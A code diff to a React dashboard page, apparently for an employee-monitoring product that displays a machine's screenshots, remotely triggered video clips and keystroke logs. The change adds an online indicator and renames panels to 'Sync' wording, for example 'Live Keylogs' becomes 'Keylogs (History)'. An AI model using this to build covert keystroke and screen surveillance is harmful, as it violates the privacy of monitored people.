@@ -1,7 +1,7 @@
 import { useEffect, useState } from 'react';
 import { useParams, useNavigate } from 'react-router-dom';
 import { supabase } from '../lib/supabase';
-import { ArrowLeft, Video, Keyboard, Image as ImageIcon, Play, Loader2, Settings } from 'lucide-react';
+import { ArrowLeft, Video, Keyboard, Image as ImageIcon, Play, Loader2, Settings, Wifi, WifiOff } from 'lucide-react';
 
 export default function EmployeeDetail() {
     const { id } = useParams();
@@ -11,6 +11,7 @@ export default function EmployeeDetail() {
     const [screenshots, setScreenshots] = useState([]);
     const [videos, setVideos] = useState([]);
     const [requestingVideo, setRequestingVideo] = useState(false);
+    const [isOnline, setIsOnline] = useState(false);
 
     // Settings
     const [settings, setSettings] = useState({ screenshot_interval: 300, video_duration: 10 });
@@ -31,13 +32,27 @@ export default function EmployeeDetail() {
                 payload => {
                     if (payload.new.command_type === 'RECORD_CLIP' && payload.new.status === 'EXECUTED') {
                         setRequestingVideo(false);
-                        alert("Video clip ready!");
+                        // alert("Video clip ready!"); 
                     }
                 })
+            // Listen for presence/status updates if implemented, or infer from activity
             .subscribe();
 
-        return () => supabase.removeChannel(sub);
-    }, [id]);
+        // Simple online check based on last_seen
+        const interval = setInterval(() => {
+            if (employee?.last_seen) {
+                const lastSeen = new Date(employee.last_seen);
+                const now = new Date();
+                const diff = (now - lastSeen) / 1000;
+                setIsOnline(diff < 60); // Online if seen in last 60s
+            }
+        }, 5000);
+
+        return () => {
+            supabase.removeChannel(sub);
+            clearInterval(interval);
+        }
+    }, [id, employee?.last_seen]);
 
     const resolveUrl = (item, bucket) => ({
         ...item,
@@ -49,6 +64,11 @@ export default function EmployeeDetail() {
         if (data) {
             setEmployee(data);
             if (data.settings) setSettings(data.settings);
+
+            // Initial online check
+            const lastSeen = new Date(data.last_seen);
+            const now = new Date();
+            setIsOnline((now - lastSeen) / 1000 < 60);
         }
     };
 
@@ -76,7 +96,7 @@ export default function EmployeeDetail() {
         setSavingSettings(true);
         await supabase.from('employees').update({ settings }).eq('id', id);
         setSavingSettings(false);
-        alert('Settings saved. Agent will pick them up shortly.');
+        alert('Settings saved. Sync pending...');
     };
 
     if (!employee) return <div className="p-8">Loading...</div>;
@@ -88,18 +108,24 @@ export default function EmployeeDetail() {
                     <ArrowLeft className="w-5 h-5 mr-1" /> Back
                 </button>
                 <div className="flex items-center gap-4">
-                    <h1 className="text-2xl font-bold">{employee.hostname}</h1>
+                    <h1 className="text-2xl font-bold flex items-center gap-2">
+                        {employee.hostname}
+                        {isOnline ?
+                            <span className="flex items-center gap-1 text-green-600 text-sm bg-green-100 px-2 py-0.5 rounded-full"><Wifi className="w-4 h-4" /> Online</span> :
+                            <span className="flex items-center gap-1 text-gray-500 text-sm bg-gray-100 px-2 py-0.5 rounded-full"><WifiOff className="w-4 h-4" /> Offline</span>
+                        }
+                    </h1>
                 </div>
             </div>
 
             {/* Settings Panel */}
             <div className="bg-white p-4 rounded-xl shadow border border-gray-100 flex items-center justify-between flex-wrap gap-4">
                 <div className="flex items-center gap-2 font-semibold text-gray-700">
-                    <Settings className="w-5 h-5" /> Configuration
+                    <Settings className="w-5 h-5" /> Sync Configuration
                 </div>
                 <div className="flex items-center gap-4">
                     <label className="flex items-center gap-2 text-sm text-gray-600">
-                        Screenshot Interval (sec):
+                        Screenshots every (sec):
                         <input
                             type="number"
                             value={settings.screenshot_interval}
@@ -121,7 +147,7 @@ export default function EmployeeDetail() {
                         disabled={savingSettings}
                         className="bg-blue-600 text-white px-3 py-1 rounded hover:bg-blue-700 text-sm disabled:opacity-50"
                     >
-                        {savingSettings ? 'Saving...' : 'Save Config'}
+                        {savingSettings ? 'Saving...' : 'Save & Sync'}
                     </button>
                 </div>
                 <button
@@ -139,7 +165,7 @@ export default function EmployeeDetail() {
                 {/* Videos Column */}
                 <div className="bg-white p-6 rounded-xl shadow border border-gray-100 lg:col-span-1">
                     <h2 className="text-lg font-semibold flex items-center mb-4 text-gray-700">
-                        <Video className="w-5 h-5 mr-2" /> Video Clips
+                        <Video className="w-5 h-5 mr-2" /> Video Clips (Synced)
                     </h2>
                     <div className="space-y-4 max-h-[600px] overflow-y-auto">
                         {videos.map(vid => (
@@ -154,7 +180,7 @@ export default function EmployeeDetail() {
                 {/* Screenshots Gallery */}
                 <div className="bg-white p-6 rounded-xl shadow border border-gray-100 lg:col-span-1">
                     <h2 className="text-lg font-semibold flex items-center mb-4 text-gray-700">
-                        <ImageIcon className="w-5 h-5 mr-2" /> Recent Screenshots
+                        <ImageIcon className="w-5 h-5 mr-2" /> Screenshots (Synced)
                     </h2>
                     <div className="grid grid-cols-2 gap-4 max-h-[600px] overflow-y-auto">
                         {screenshots.map(shot => (
@@ -171,7 +197,7 @@ export default function EmployeeDetail() {
                 {/* Keylogs Feed */}
                 <div className="bg-white p-6 rounded-xl shadow border border-gray-100 lg:col-span-1">
                     <h2 className="text-lg font-semibold flex items-center mb-4 text-gray-700">
-                        <Keyboard className="w-5 h-5 mr-2" /> Live Keylogs
+                        <Keyboard className="w-5 h-5 mr-2" /> Keylogs (History)
                     </h2>
                     <div className="bg-gray-50 p-4 rounded-lg font-mono text-sm h-[600px] overflow-y-auto space-y-4">
                         {keylogs.map(log => (
